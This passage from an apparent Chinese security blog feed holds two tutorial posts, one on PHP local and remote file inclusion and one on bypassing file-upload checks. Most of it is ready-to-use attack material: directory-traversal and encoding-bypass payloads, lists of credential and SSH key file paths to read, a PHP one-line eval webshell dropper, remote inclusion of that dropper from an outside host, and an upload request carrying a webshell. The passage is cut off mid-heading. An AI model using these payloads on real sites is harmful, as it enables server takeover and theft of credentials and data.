image/x-xbitmap, */*;q=0.1HTTP_COOKIE=PHPSESSID=134cc7261b341231b9594844ac2ad7ac HTTP_HOST=www.test.com HTTP_REFERER=http://www.test.com/index.php HTTP_USER_AGENT=Opera/9.80 (Windows NT 5.1; U; en) Presto/2.2.15 Version/10.00 PATH=/bin:/usr/bin QUERY_STRING=view=..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron REDIRECT_STATUS=200 REMOTE_ADDR=6x.1xx.4x.1xx REMOTE_PORT=35665 REQUEST_METHOD=GET REQUEST_URI=/index.php?view=..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron SCRIPT_FILENAME=/home/sirgod/public_html/index.php SCRIPT_NAME=/index.php SERVER_ADDR=1xx.1xx.1xx.6x SERVER_ADMIN=webmaster@test.com SERVER_NAME=www.website.com SERVER_PORT=80 SERVER_PROTOCOL=HTTP/1.0 SERVER_SIGNATURE=Apache/1.3.37 (Unix) mod_ssl/2.2.11 OpenSSL/0.9.8i DAV/2mod_auth_passthrough/2.1 mod_bwlimited/1.4 FrontPage/5.0.2.2635 Server at www.test.com Port 80</code></pre><p>可以参考这个：</p><ol><li><a href="http://websecuritylog.blogspot.jp/2010/06/procselfenviron-injection.html" target="_blank" rel="noopener">The proc/self/environ Injection</a></li><li><a href="https://www.exploit-db.com/papers/12886/" target="_blank" rel="noopener">shell via LFI - proc/self/environ method</a></li></ol><h3 id="包含fd"><a href="#包含fd" class="headerlink" title="包含fd"></a>包含fd</h3><p>跟包含environ类似。</p><p>参考：  <a href="https://highon.coffee/blog/lfi-cheat-sheet/#procselffd-lfi-method" target="_blank" rel="noopener">LFI Cheat Sheet：/proc/self/environ LFI Method</a></p><h3 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h3><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.45boams7q0n_1536892681" alt></p><p>php中上传文件，会创建临时文件。在linux下使用<code>/tmp</code>目录，而在windows下使用<code>c:\winsdows\temp</code>目录。在临时文件被删除之前，利用<strong>竞争</strong>即可包含该临时文件。</p><p>由于包含需要知道包含的文件名。一种方法是进行<strong>暴力猜解</strong>，linux下使用的<strong>随机函数有缺陷</strong>，而window下只有<code>65535</code>中不同的文件名，所以这个方法是可行的。</p><p>另一种方法是配合phpinfo页面的<code>php variables</code>，可以直接获取到<strong>上传文件的存储路径和临时文件名</strong>，直接包含即可。这个方法可以参考<a href="https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf" target="_blank" rel="noopener">LFI With PHPInfo Assistance</a></p><p>类似利用临时文件的存在，竞争时间去包含的，可以看看这道CTF题 <a href="https://chybeta.github.io/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-babyweb-writeup/" target="_blank" rel="noopener">XMAN夏令营-2017-babyweb-writeup | Chybeta</a></p><h3 id="本地包含配合文件上传"><a href="#本地包含配合文件上传" class="headerlink" title="本地包含配合文件上传"></a>本地包含配合文件上传</h3><h4 id="说明-3"><a href="#说明-3" class="headerlink" title="说明"></a>说明</h4><p>很多网站通常会提供文件上传功能，比如：上传头像，文档等。</p><h4 id="利用条件：-7"><a href="#利用条件：-7" class="headerlink" title="利用条件："></a>利用条件：</h4><p>千变万化，不过至少得知道上传的文件在哪，叫啥名字。。。</p><p><strong>假设已经上传一句话图片木马到服务器</strong>，路径为：</p><pre><code>/uploadfile/201363.jpg</code></pre><p>图片代码如下：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?</span><span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"shell.php"</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"&lt;?php eval($_POST[xxser]);?>"</span><span class="token punctuation">)</span><span class="token delimiter">?></span></code></pre><h4 id="姿势：-7"><a href="#姿势：-7" class="headerlink" title="姿势："></a>姿势：</h4><p>访问URL：</p><pre><code>http://www.xxser.com/Index.php?page=./uploadfile/201363.jpg</code></pre><p>包含这张图片，将会在<code>Index.php</code>所在的目录下生成<code>shell.php</code>，此时可以通过中国菜刀连接了。</p><h3 id="读取敏感信息"><a href="#读取敏感信息" class="headerlink" title="读取敏感信息"></a>读取敏感信息</h3><p>访问URL：<code>http://www.xxser.com/index.php?page=/etc/passwd</code>,如果<strong>目标主机文件存在，并且有相应的权限</strong>，那么就可以读出文件内容。反之，会得到类似<code>open_basedirrestriction in effect.</code>的警告</p><pre><code># 如下是例子，其中的../用于返回根目录，九个即可?file=../../../../../../../../../usr/local/apache2/conf/httpd.conf</code></pre><p><a href="http://wiki.apache.org/httpd/DistrosDefaultLayout" target="_blank" rel="noopener">更多敏感信息路径</a></p><h4 id="常见敏感信息路径如下"><a href="#常见敏感信息路径如下" class="headerlink" title="常见敏感信息路径如下"></a>常见敏感信息路径如下</h4><h5 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h5><pre><code>C:\boot.ini        // 查看系统版本C:\windows\system32\inetsrv\MetaBase.xml    // IIS配置文件C:\windows\repair\sam                                    // 存储Windows系统初次安装的密码C:\Program Files\mysql\my.ini                          // Mysql配置C:\Program Files\mysql\data\mysql\user.MYD // Mysql rootC:\windows\php.ini                                           // php配置信息C:\windows\my.ini                                            // Mysql配置文件</code></pre><h5 id="Linux-Unix"><a href="#Linux-Unix" class="headerlink" title="Linux/Unix"></a>Linux/Unix</h5><h6 id="普通权限"><a href="#普通权限" class="headerlink" title="普通权限"></a>普通权限</h6><pre><code>/etc/passwd/usr/local/app/apache2/conf/httpd.conf                            // apache2默认配置文件/usr/local/app/apache2/conf/extra/httpd-vhosts.conf         // 虚拟网站设置/usr/local/app/php5/lib/php.ini                                          // PHP相关配置/etc/httpd/conf/httpd.conf                                               // apache配置文件/etc/my.cnf                                                                       // Mysql的配置文件/var/log/apache/error.log/proc/self/environ/var/log//var/log/apache/access.log</code></pre><h6 id="root权限"><a href="#root权限" class="headerlink" title="root权限:"></a>root权限:</h6><pre><code>/root/.ssh/authorized_keys/root/.ssh/id_rsa/root/.ssh/id_rsa.keystore/root/.ssh/id_rsa.pub/root/.ssh/known_hosts/etc/shadow/root/.bash_history/root/.mysql_history/var/log/wtmp/var/run/utmp</code></pre><h3 id="远程包含shell"><a href="#远程包含shell" class="headerlink" title="远程包含shell"></a>远程包含shell</h3><h4 id="前提："><a href="#前提：" class="headerlink" title="前提："></a>前提：</h4><p>目标主机的<code>allow_url_fopen</code>是激活的，那么就可以尝试<strong>远程包含一句话木马</strong>，假设我的一句话木马放在我的网站<code>http://www.2cto.com/echo.txt</code>上，代码如下：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?</span><span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"shell.php"</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"&lt;?php eval($_POST[xxser]);?>"</span><span class="token punctuation">)</span><span class="token delimiter">?></span></code></pre><p>这时候访问url：<code>http://www.xxser.com/index.php?page=http://www.2cto.com/echo.txt</code>,将会在<code>index.php</code>所在的目录生成<code>shell.php</code>,内容如下：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>xxser<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>这时候再用菜刀去连接即可</p><h3 id="其余"><a href="#其余" class="headerlink" title="其余"></a>其余</h3><p>一个web服务往往会用到多个其他服务，比如ftp服务，数据库等等。这些应用也会产生相应的文件，但这就需要具体情况具体分析咯。这里就不展开了</p><h2 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h2><p>接下来聊聊绕过姿势。平常碰到的情况肯定不会是简简单单的<code>include $_GET[&#39;file&#39;];</code>这样直接把变量传入包含函数的。在很多时候包含的变量/文件不是完全可控的，比如下面这段代码<strong>指定了前缀和后缀</strong></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">include</span> <span class="token string">'/var/www/html/'</span><span class="token punctuation">.</span><span class="token variable">$file</span><span class="token punctuation">.</span><span class="token string">'/test/test.php'</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>这样就很“难”直接去包含前面提到的种种文件。</p><h3 id="指定前缀"><a href="#指定前缀" class="headerlink" title="指定前缀"></a>指定前缀</h3><p>先考虑一下指定了前缀的情况吧。测试代码:</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">include</span> <span class="token string">'/var/www/html/'</span><span class="token punctuation">.</span><span class="token variable">$file</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><h4 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h4><pre><code>?file=../../../../../../../../../var/lib/locate.db ?file=../../../../../../../../../var/lib/mlocate/mlocate.db# linux中这两个文件储存着所有文件的路径，需要root权限</code></pre><p>现在在<code>/var/log/test.txt</code>文件中有php代码<code>&lt;?php phpinfo();?&gt;</code>，则利用<code>../</code>可以进行<strong>目录遍历</strong>，比如我们尝试访问：</p><pre><code>include.php?file=../../log/test.txt</code></pre><p>则服务器端实际拼接出来的路径为：<code>/var/www/html/../../log/test.txt</code>，也即<code>/var/log/test.txt</code>。从而包含成功</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.inhqxe39yf_1536892695" alt></p><h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><p>服务器端常常会对于<code>../</code>等做一些过滤，可以用一些<strong>编码</strong>来进行绕过。下面这些总结来自《白帽子讲Web安全》。</p><ul><li>利用url编码<ul><li><code>../</code><ul><li><code>%2e%2e%2f</code></li><li><code>..%2f</code></li><li><code>%2e%2e/</code></li></ul></li><li><code>..\</code><ul><li><code>%2e%2e%5c</code></li><li><code>..%5c</code></li><li><code>%2e%2e\</code></li></ul></li></ul></li><li>二次编码<ul><li><code>../</code><ul><li><code>%252e%252e%252f</code></li></ul></li><li><code>..\</code><ul><li><code>%252e%252e%255c</code></li></ul></li></ul></li><li>容器/服务器的编码方式<ul><li><code>../</code><ul><li><code>..%c0%af</code><ul><li>注：<a href="https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work" target="_blank" rel="noopener">Why does Directory traversal attack %C0%AF work</a></li></ul></li><li><code>%c0%ae%c0%ae/</code><ul><li>注：java中会把”<code>%c0%ae</code>”解析为”<code>\uC0AE</code>”，最后转义为ASCCII字符的”<code>.</code>”（点）</li><li>Apache Tomcat Directory Traversal</li></ul></li></ul></li><li><code>..\</code><ul><li><code>..%c1%9c</code><h3 id="指定后缀"><a href="#指定后缀" class="headerlink" title="指定后缀"></a>指定后缀</h3>接着考虑<strong>指定后缀</strong>的情况。测试代码:</li></ul></li></ul></li></ul><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">include</span> <span class="token variable">$file</span><span class="token punctuation">.</span><span class="token string">'/test/test.php'</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><h4 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h4><p>url格式</p><pre><code>protocol :// hostname[:port] / path / [;parameters][?query]#fragment</code></pre><p>在远程文件包含漏洞（RFI）中，可以利用<code>query</code>或<code>fragment</code>来绕过后缀限制。</p><h5 id="姿势一：query（？）"><a href="#姿势一：query（？）" class="headerlink" title="姿势一：query（？）"></a>姿势一：<code>query（？）</code></h5><pre><code>index.php?file=http://remoteaddr/remoteinfo.txt?</code></pre><p>则包含的文件为 <code>http://remoteaddr/remoteinfo.txt?/test/test.php</code><br>问号后面的部分<code>/test/test.php</code>，也就是指定的后缀被当作<code>query</code>从而被绕过</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.pzruqe9hc9_1536892706" alt></p><h5 id="姿势二：fragment（-）"><a href="#姿势二：fragment（-）" class="headerlink" title="姿势二：fragment（#）"></a>姿势二：<code>fragment（#）</code></h5><pre><code>index.php?file=http://remoteaddr/remoteinfo.txt%23</code></pre><p>则包含的文件为 <code>http://remoteaddr/remoteinfo.txt#/test/test.php</code><br>问号后面的部分<code>/test/test.php</code>，也就是指定的后缀被当作<code>fragment</code>从而被绕过。注意需要把<code>#</code>进行url编码为<code>%23</code>。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.w2pf1u0sgd_1536892713" alt></p><h4 id="长度截断"><a href="#长度截断" class="headerlink" title="长度截断"></a>长度截断</h4><p>利用条件： php版本 &lt; php 5.2.8</p><p><strong>目录字符串</strong>，在linux下<code>4096</code>字节时会达到最大值，在window下是<code>256</code>字节。只要不断的重复<code>./</code>或者<code>../</code></p><pre><code>index.php?file=././././。。。省略。。。././shell.txt</code></pre><p>则后缀<code>/test/test.php</code>，在<strong>达到最大值后会被直接丢弃掉</strong></p><h4 id="0字节截断"><a href="#0字节截断" class="headerlink" title="0字节截断"></a>0字节截断</h4><p>利用条件：magic_quotes_gpc=off, php版本 &lt; php 5.3.4</p><pre><code>index.php?file=phpinfo.txt%00# 或者需要回到根目录，利用../?file=../../../../../../../../../etc/passwd%00# 或者是?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.</code></pre><blockquote><p>tips:<code>[...]</code>的意思是很多个点</p></blockquote><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.gzc7mn8xsm_1536892722" alt></p><p>能利用00截断的场景现在应该很少了</p><h5 id="经验总结"><a href="#经验总结" class="headerlink" title="经验总结"></a>经验总结</h5><p>若是<strong>过滤了远程文件包含和我们目录的跳转</strong></p><ol><li><code>大小写混合输入</code>就可以绕过远程文件包含的过滤</li><li>目录跳转的过滤我们可以构造<code>….//….//xxx.php</code>，方式绕过</li></ol><h4 id="点号截断"><a href="#点号截断" class="headerlink" title="点号截断"></a>点号截断</h4><pre><code>?file=../../../../../../../../../boot.ini/………[…]…………</code></pre><p>php版本小于5.2.8(?)可以成功，只适用windows，<strong>点号需要长于256*</strong></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="http://programmer.zhujunwu.cn/article/34231" target="_blank" rel="noopener">http://programmer.zhujunwu.cn/article/34231</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传解析总结</title>
      <link href="/2019/03/11/wen-jian-shang-chuan-jie-xi-zong-jie/"/>
      <url>/2019/03/11/wen-jian-shang-chuan-jie-xi-zong-jie/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ul><li>本文参考如下链接: <a href="https://github.com/CHYbeta/Web-Security-Learning" target="_blank" rel="noopener">https://github.com/CHYbeta/Web-Security-Learning</a></li></ul><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Web站点一般会有<strong>用户注册</strong>的功能，当用户注册之后，大多数情况下都会存在类似<strong>头像上传</strong>等个性化的设置，这些功能点往往存在上传验证方式不严格的安全缺陷，这些安全缺陷在Web渗透中是非常关键的突破口，只要经过仔细测试分析上传验证机制，往往就能找到绕过验证的方法，进而上传恶意代码获取整个Web业务控制权，复杂一点的情况是配合 Web Server的解析漏洞来获取控制权。</p><a id="more"></a><h2 id="上传检测流程"><a href="#上传检测流程" class="headerlink" title="上传检测流程"></a>上传检测流程</h2><p>通常一个文件以HTTP协议进行上传时，将以POST请求发送至Web服务器，Web服务器接收到请求并同意后，用户与Web服务器将建立连接，并传输数据。<strong>一般文件上传过程中将会经过如下几个检测步骤</strong>：</p><ul><li>客户端JavaScript检测 (通常为检测<code>文件扩展名</code>)</li><li>服务端MIME类型检测 (检测<code>Content-Type</code>内容)</li><li>服务端目录路径检测 (检测跟<code>Path</code>参数相关的内容)</li><li>服务端文件扩展名检测 (检测跟文件<code>extension</code>相关的内容)</li><li>服务端文件内容检测 (检测内容是否合法或含有<code>恶意代码</code>)</li></ul><h2 id="常用测试方法"><a href="#常用测试方法" class="headerlink" title="常用测试方法"></a>常用测试方法</h2><ol><li>上传<code>jpg</code>文件，抓包修改文件类型为脚本格式（<code>asp、aspx、php、jsp</code>等）。</li><li>有些应用检测上传文件类型时，通过文件名中的第一个‘<code>.</code>’来分割文件后缀名，所以可以尝试上传<code>xxx.jpg.php(asp、aspx、jsp等)</code>。</li></ol><h2 id="上传绕过方向"><a href="#上传绕过方向" class="headerlink" title="上传绕过方向"></a>上传绕过方向</h2><p>这里上传<code>xx.php</code>,然后用bp代理截断</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1528644963_111492190_1536893293" alt></p><pre><code>POST /Index/shareUpload HTTP/1.1Host: qingwendang.comContent-Length: 221Accept: */*Origin: http://qingwendang.comX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.79 Safari/537.36Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAEFWShaIYBzgEpLDReferer: http://qingwendang.com/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=bbsd036dj7d15on6rpct8tvlr5; Hm_lvt_4cf8af0a5f94f595e1b5765fcb4ee431=1528564990,1528644560; Hm_lpvt_4cf8af0a5f94f595e1b5765fcb4ee431=1528644560Connection: close------WebKitFormBoundaryAEFWShaIYBzgEpLDContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;xx.php&quot;Content-Type: application/x-php&lt;?php @eval($_POST[&#39;key&#39;]);?&gt;------WebKitFormBoundaryAEFWShaIYBzgEpLD--</code></pre><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1528645407_2091826910_1536893300" alt></p><p>从中获取特征为：</p><ul><li>请求Header中<code>Content-Type</code>存在以下特征：<ul><li><code>multipart/form-data</code>（表示该请求是<strong>一个文件上传请求</strong>）</li><li>存在<code>boundary</code>字符串（作用为<strong>分隔符，以区分POST数据</strong>）</li></ul></li><li>POST的内容存在以下特征：<ul><li><code>Content-Disposition</code></li><li><code>name</code></li><li><code>filename</code></li></ul></li><li><code>POST</code>中的<code>boundary</code>的值就是<code>Content-Type</code>的值在最前面加了两个<code>--</code>，除了最后标识结束的<code>boundary</code></li><li>最后标识结束的<code>boundary</code>最后默认会多出两个<code>--</code>（测试时，最后一行的<code>boundary</code>删掉也能成功上传）</li><li>获取文件名的地方在<code>Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;xx.php&quot;</code>和<code>Content-Type</code>里，所以绕过的地方也就在这两个地方了。</li></ul><h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><h3 id="客户端检测-JavaScript检测"><a href="#客户端检测-JavaScript检测" class="headerlink" title="客户端检测(JavaScript检测)"></a>客户端检测(JavaScript检测)</h3><h4 id="检测说明"><a href="#检测说明" class="headerlink" title="检测说明"></a>检测说明</h4><p>这类检测，通常是<strong>在上传页面里含有专门检测文件上传的JavaScript代码</strong>，最常见的就是<code>检测扩展名是否合法</code>，示例代码如下：</p><pre class=" language-JavaScript"><code class="language-JavaScript">function check(){  var filename = document.getElementById("file");  var str = filename.value.split(".");  var ext = str[str.length-1];  if(ext=='jpg'||ext=='png'||ext=='jpeg'||ext=='gif')  {    return true;  }  else  {    alert("仅允许上传png/jpeg/gif类型的文件！")    return false;  }  return false;}</code></pre><h4 id="判断该类检测的套路"><a href="#判断该类检测的套路" class="headerlink" title="判断该类检测的套路"></a>判断该类检测的套路</h4><ol><li>选择一个<strong>禁止上传类型</strong>的文件上传，当点击<strong>确定</strong>按钮之后，浏览器立即<strong>弹窗提示禁止上传</strong>，一般就可以断定为<code>客户端JavaScript检测</code></li><li>可以通过<strong>配置浏览器HTTP代理（没有流量经过代理就可以证明是客户端JavaScript检测）</strong>。</li></ol><h4 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h4><ul><li>上传页面，审查元素，修改JavaScript检测函数,如利用<code>Firebug</code>定位到检测函数的调用,然后删掉它；</li><li>将需要<strong>上传的恶意代码文件类型改为允许上传的类型</strong>，例如将<code>dama.asp</code>改为<code>dama.jpg</code>上传，配置<code>Burp Suite</code>代理进行抓包，然后再将文件名<code>dama.jpg</code>改为<code>dama.asp</code>。</li><li>上传<code>webshell.jpg.jsp</code>，<strong>可能前端程序检查后缀时，从<code>前面</code>开始检查</strong>。</li><li>用Firefox插件: <code>yesscript2</code> 链接: <a href="https://addons.mozilla.org/zh-CN/firefox/addon/yesscript2/?src=search" target="_blank" rel="noopener">https://addons.mozilla.org/zh-CN/firefox/addon/yesscript2/?src=search</a></li></ul><h3 id="服务端MIME类型检测"><a href="#服务端MIME类型检测" class="headerlink" title="服务端MIME类型检测"></a>服务端MIME类型检测</h3><blockquote><p><code>MIME</code>类型用来设定<strong>某正扩展名文件的打开方式</strong>,当具有改扩展名的文件被访问时,浏览器会自动使用指定的应用程序来打开.如<code>GIF图片</code>MIME为<code>image/gif</code>,<code>CSS文件</code>MIME类型为<code>text/css</code></p></blockquote><h4 id="检测说明-1"><a href="#检测说明-1" class="headerlink" title="检测说明"></a>检测说明</h4><p>服务器端检测文件MIME类型可能的代码如下：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'userfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">"image/gif"</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//检测Content-type</span>    <span class="token keyword">echo</span><span class="token string">"Sorry,we only allow uploading GIF images"</span><span class="token punctuation">;</span>    exit<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token variable">$uploaddir</span><span class="token operator">=</span><span class="token string">'uploads/'</span><span class="token punctuation">;</span>  <span class="token variable">$uploadfile</span><span class="token operator">=</span><span class="token variable">$uploaddir</span><span class="token punctuation">.</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'userfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'userfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$uploadfile</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">echo</span><span class="token string">"File is valid,and was successfully uploaded.\n"</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token keyword">echo</span><span class="token string">"File uploading failed.\n"</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><h4 id="绕过姿势-1"><a href="#绕过姿势-1" class="headerlink" title="绕过姿势"></a>绕过姿势</h4><ul><li>上传<code>dama.php</code>时，然后配置<code>Burp Suite</code>代理进行拦截查看MIME类型，可以发现PHP文件的MIME类型为:<code>application/php</code>,将<code>Content-Type</code>的值修改为<code>image/gif</code>，或者其他允许的类型即可通过程序验证.。</li><li>常用<code>Content-Type</code>常用取值如下:</li></ul><table><thead><tr><th align="center">扩展名</th><th align="center">MIME类型</th></tr></thead><tbody><tr><td align="center">gif</td><td align="center">image/gif</td></tr><tr><td align="center">png</td><td align="center">image/png</td></tr><tr><td align="center">jpg</td><td align="center">image/jpeg</td></tr><tr><td align="center">js</td><td align="center">text/javascript</td></tr><tr><td align="center">htm</td><td align="center">text/html</td></tr><tr><td align="center">html</td><td align="center">text/html</td></tr></tbody></table><h3 id="服务端目录路径检测"><a href="#服务端目录路径检测" class="headerlink" title="服务端目录路径检测"></a>服务端目录路径检测</h3><blockquote><p>在文件上传时,程序通常允许用户将文件放到指定的目录中,而有些Web开发人员为了让代码更加”健壮”,通常会做一个操作:<strong>如果指定的目录存在,就将文件写入目录中,不存在则先建立目录,然后写入</strong>.这就意味着,我们可以通过bp操控目录了.</p></blockquote><p>上传的数据包中，如果存在<code>path</code>(或者其他名称)等<strong>能够操作上传路径的参数，修改该参数配合解析漏洞Get Webshell</strong>，该方法一般asp系统用比较多。</p><p>例如<code>path</code>参数为如下“<code>upfile/</code>”，可以尝试修改为“<code>upfile.asp/</code>”或者“<code>upfile/1.asp/</code>”或者“<code>upfile/1.asp;.</code>”，注意观察返回的文件名。返回的文件名可能为：<code>upfile/1.asp;.201704117886.jpg</code>，满足<code>IIS6.0</code>解析漏洞。</p><blockquote><p>IIS6.0在解析文件的时候，存在以下两个漏洞</p><ol><li>当建立<code>*.asa</code>、<code>*.asp</code>格式的<code>文件夹</code>时，其目录下的任意文件都将被IIS当作<code>asp文件</code>来解析</li><li>当<code>文件</code>为<code>*.asp;1.jpg</code>时，IIS6.0同样会以<code>ASP</code>脚本执行</li></ol></blockquote><h3 id="服务端文件扩展名检测"><a href="#服务端文件扩展名检测" class="headerlink" title="服务端文件扩展名检测"></a>服务端文件扩展名检测</h3><h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><h5 id="黑名单检测："><a href="#黑名单检测：" class="headerlink" title="黑名单检测："></a>黑名单检测：</h5><p>黑名单的安全性比白名单低很多，服务器端，一般会有个专门的<code>blacklist</code>文件，里面会包含常见的危险脚本文件类型，例如：</p><pre><code>html | htm | php | php2 | hph3 | php4 | php5 | asp | aspx | ascx | jsp | cfm | cfcbat | exe | com | dll | vbs | js | reg | cgi | htaccess | asis | sh等等</code></pre><h5 id="白名单检测："><a href="#白名单检测：" class="headerlink" title="白名单检测："></a>白名单检测：</h5><p>仅允许指定的文件类型上传，比如仅允许上传<code>jpg | gif | doc | pdf</code>等类型的文件，其他文件全部禁止。</p><h4 id="绕过方法："><a href="#绕过方法：" class="headerlink" title="绕过方法："></a>绕过方法：</h4><h5 id="文件名大小写绕过-适用于黑名单检测方式-："><a href="#文件名大小写绕过-适用于黑名单检测方式-：" class="headerlink" title="文件名大小写绕过(适用于黑名单检测方式)："></a>文件名大小写绕过(适用于黑名单检测方式)：</h5><ul><li>使用<code>Asp</code>、<code>aSp</code>、<code>PhP</code>、<code>pHp</code>之类的扩展名在Windows平台上依然会被Web容器解析,从而绕过黑名单检测</li></ul><h5 id="名单列表绕过："><a href="#名单列表绕过：" class="headerlink" title="名单列表绕过："></a>名单列表绕过：</h5><ul><li>用黑名单里没有的名单进行攻击，比如很名单中没有的<code>asa</code>或者<code>cer</code>之类</li><li>能被解析的文件扩展名列表：</li></ul><pre><code>jsp jspx jspfasp asa cer aspxphp php php3 php4exe exee</code></pre><h5 id="特殊文件名绕过-适用于黑名单检测方式-："><a href="#特殊文件名绕过-适用于黑名单检测方式-：" class="headerlink" title="特殊文件名绕过(适用于黑名单检测方式)："></a>特殊文件名绕过(适用于黑名单检测方式)：</h5><p>比如在发送的HTTP包中，将文件名改为”<code>dama.asp.</code>”或者”<code>dama.asp_</code>”(下划线为空格)，这种命名方式在window系统里是不被允许的，所以需要在<code>Burp Suite</code>中抓包修改，上传之后，文件名会被<strong>window自动去掉后面的点或者空格</strong>，需要注意此种方法仅对window有效，Unix/Linux系统没有这个特性。</p><h5 id="0x00截断绕过-适用于白名单检测方式-："><a href="#0x00截断绕过-适用于白名单检测方式-：" class="headerlink" title="0x00截断绕过(适用于白名单检测方式)："></a>0x00截断绕过(适用于白名单检测方式)：</h5><p>伪代码如下：</p><pre><code>Name = getname(http requests)//假如这一步获取到的文件名是dama.asp.jpg(asp 后面为 0x00)Type = gettype(name)//而在该函数中，是从后往前扫描文件扩展名，所以判断为jpg文件If(type == jpg)SaveFileToPath(UploadPath.name , name)//但在这里却是以0x00作为文件名截断，最后以dama.asp存入路径里</code></pre><h6 id="方法一-在Hex中修改"><a href="#方法一-在Hex中修改" class="headerlink" title="方法一:在Hex中修改"></a>方法一:在Hex中修改</h6><p>上传<code>dama.jpg</code>，<code>Burp</code>抓包，将文件名改为<code>dama.php空格.jpg</code>,然后单击<code>HEX</code>选项卡进入十六进制编辑模式,将文件名中的空格的十六进制<code>20</code>改为<code>00</code>,单击<code>GO</code>按钮发送出去</p><h6 id="方法二-url-decode"><a href="#方法二-url-decode" class="headerlink" 